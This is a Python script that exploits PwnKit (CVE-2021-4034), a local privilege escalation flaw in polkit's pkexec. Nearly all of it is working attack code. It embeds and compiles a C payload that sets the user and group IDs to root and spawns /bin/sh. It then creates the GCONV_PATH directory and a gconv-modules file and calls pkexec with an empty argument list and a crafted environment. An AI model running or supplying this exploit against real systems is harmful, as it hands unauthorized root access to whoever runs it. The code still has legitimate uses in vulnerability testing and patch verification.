#!/usr/bin/python3

"""
This script come without any guarantee - USE IT AT YOUR OWN RISK
It exploits PwnKit - Local Privilege Escalation Vulnerability in polkitâ€™s pkexec (CVE-2021-4034)
This is a simple Python script, inspired by the following resources:
https://github.com/arthepsy/CVE-2021-4034
https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
Requirement: gcc
"""

import os, subprocess, sys
from ctypes import *
from ctypes.util import find_library

# Shell definition, which will be compiled after
shell = """#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
	setuid(0); setgid(0);
	seteuid(0); setegid(0);
	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");
	exit(0);
}"""

# Directory GCONV_PATH=. creation
try:
	os.system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
except:
	print("Directory \"GCONV_PATH=.\" already exists")
	exit(1)
# Directory pwnkit creation
try:
	os.system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
except:
	print("Directory \"pwnkit\" already exists")
	exit(1)

# Writing the shell on the required file
file = open("pwnkit/pwnkit.c", "a")
file.write(shell)
file.close()

# Exploit compilation
try:
	os.system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
except:
	print("Problem while compiling. Is GCC installed ?")

# Creation of the environment for execve
env = [b'pwnkit', b'PATH=GCONV_PATH=.', b'CHARSET=PWNKIT', b'SHELL=pwnkit', None]
env_p = (c_char_p * len(env))()
env_p[:] = env

# It is mandatory to use the C lib as Python do not allow to run execve() without arguments
libc = CDLL(find_library('c'))
libc.execve(b'/usr/bin/pkexec', c_char_p(None), env_p)
